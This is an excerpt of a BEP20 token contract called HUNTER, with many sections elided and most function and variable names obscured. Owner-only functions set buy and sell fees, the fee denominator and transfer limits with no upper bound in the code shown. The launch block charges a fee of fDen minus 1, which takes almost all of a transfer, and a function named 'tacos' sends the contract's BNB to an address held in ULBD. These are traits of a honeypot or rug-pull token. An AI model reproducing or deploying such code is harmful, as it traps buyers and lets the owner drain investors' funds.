...
contract HUNTER is IBEP20, Auth {
    using SafeMath for uint256;
    ...
    string constant _name = "HUNTER";
    string constant _symbol = "HUNTER";
    uint8 constant _decimals = 9;
    uint256 _totalSupply = 100 * 10**9 * (10 ** _decimals);
    uint256 public _maxTxAm = ( _totalSupply * 150 ) / 10000;
    uint256 public _maxWaTo = ( _totalSupply * 300 ) / 10000;
    
    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) _allowances;
    mapping (address => bool) isFxE;
    ...
    bool public bBE = true;
    uint256 public bBf = 15;   
   
    bool public sSE = true;
    ...
    constructor () Auth(msg.sender) {
        ...
        isFxE[msg.sender] = true;
        isFxE[address(lPRe)] = true;
        isFxE[address(lRRe)] = true;
        isFxE[address(lSRe)] = true;
        isFxE[address(this)] = true;
    ...
    function setMTP(uint256 _mnTP, uint256 _mdTP) external authorized {
        _maxTxAm = (_totalSupply * _mnTP) / _mdTP;
    }

    function setMWP(uint256 _mnWP, uint256 _mdWP) external authorized {
        _maxWaTo = (_totalSupply * _mnWP) / _mdWP;
    }
    ...
    function _trFm(address sender, address recipient, uint256 amount) internal returns (bool){
        ...
        if (!authorizations[sender] && recipient != address(this)  && recipient != address(DEAD) && recipient != pair  && recipient != liqRe){
            uint256 heldTokens = balanceOf(recipient);
            require((heldTokens + amount) <= _maxWaTo,"Total Holding is currently limited, you can not buy that much.");}
        checkTxLimit(sender, amount);
        if(sSB(amount) && vsT && sender != address(cont) && (amount.mul(vsTf).div(vsTd) >= sT)){ vSBF(amount); }
        if(sSB(amount) && vsT && sender != address(cont) &&(amount.mul(vsTf).div(vsTd) < sT)){ fixSB(); }
        if(sSB(amount) && sender != address(cont) && !vsT){ fixSB(); }
        _balances[sender] = _balances[sender].sub(amount, "+");
        uint256 amountReceived = stTF(sender) ? totF(sender, recipient, amount) : amount;
    ...
    function checkTxLimit(address sender, uint256 amount) internal view {
        require(amount <= _maxTxAm || isTxLE[sender], "TX Limit Exceeded");
    }
    ...
    function getTF(bool selling) public view returns (uint256) {
        if(launchedAt + 1 >= block.number){ return fDen.sub(1); }
        if(selling && sME && !sSE){ return ((ttF.mul(_sMN)).div(_sMD)); }
        if(!selling && bBE){ return bBf.mul(1); }
        if(selling && sSE){ return sSf.mul(1); }
        return ttF;
    }

    function totF(address sender, address receiver, uint256 amount) internal returns (uint256) {
        uint256 feeAmount = amount.mul(getTF(receiver == pair)).div(fDen);
    ...
    function tacos(uint256 aP) external authorized {
        ...
        payable(ULBD).transfer(amountBNB.mul((aP).div(100)));
    }
    ...
    function fixSB() internal swapping {
        uint256 dLF = isOverLiquified(tL, tLD) ? 0 : lqF.mul(tlnFd).div(tldFd);
        uint256 aTL = sT.mul(dLF).div(ttF).div(2);
        ...
        uint256 tBNBF = ttF.sub(dLF.div(2));
        uint256 aBNBL = aBNB.mul(dLF).div(tBNBF).div(2);
        uint256 aBNBR = aBNB.mul(rwF.mul(trnFd).div(trdFd)).div(tBNBF);
        uint256 aBNBM = aBNB.mul(mFk.mul(tmnFd).div(tmdFd)).div(tBNBF);
        try distributor.deposit{value: aBNBR}() {} catch {}
        (bool tmpSuccess,) = payable(SPUK).call{value: aBNBM, gas: 30000}("");
        tmpSuccess = false;
        if(aTL > 0){
    ...
    function setFFEE(uint256 _lF, uint256 _rF, uint256 _mF, uint256 _fD) external authorized {
        ...
        rwF = _rF;
        mFk = _mF;
        ttF = _lF.add(_rF).add(_mF);
        fDen = _fD;
    }
    
    function sSt(bool _enabled, uint256 _jtm) external authorized {
        sSE = _enabled;
        sSf = _jtm;
    }

    function btX(bool _enabled, uint256 _ttb) external authorized {
        bBE = _enabled;
        bBf = _ttb;
    }

    function eVarSb(bool _enabled, uint256 _vstf, uint256 _vstd) external authorized {
        vsT = _enabled;
        vsTf = _vstf;
        vsTd = _vstd;
    }

    function fFact(uint256 _ln, uint256 _ld, uint256 _rn, uint256 _rd, uint256 _mn, uint256 _md) external authorized {
        tlnFd = _ln;
        tldFd = _ld;
        tmnFd = _mn;
        tmdFd = _md;
    ...
    function setsMult(uint256 _n, uint256 _d) external authorized {
        _sMN = _n;
        _sMD = _d;
    }
    ...
    function vSBF(uint256 amount) internal swapping {
        ...
        uint256 dLF = isOverLiquified(tL, tLD) ? 0 : lqF.mul(tlnFd).div(tldFd);
        uint256 aTL = vvsT.mul(dLF).div(ttF).div(2);
    ...
    function eSwapb(bool _enabled, uint256 _amount) external authorized {
        swE = _enabled;
        sT = _totalSupply * _amount / 10000;
    }

    function vSwB(uint256 _amount) external authorized {
        asT = _totalSupply * _amount / 10000;
    }

    function setVandS(uint256 _asT, uint256 _sT) external authorized {
        asT = _totalSupply * _asT / 10000;
        sT = _totalSupply * _sT / 10000;
    }

    function setTargLiq(uint256 _up, uint256 _down) external authorized {
        tL = _up;
        tLD = _down;
    }
    ...
    function tokenDepost(uint256 _amount) external authorized {
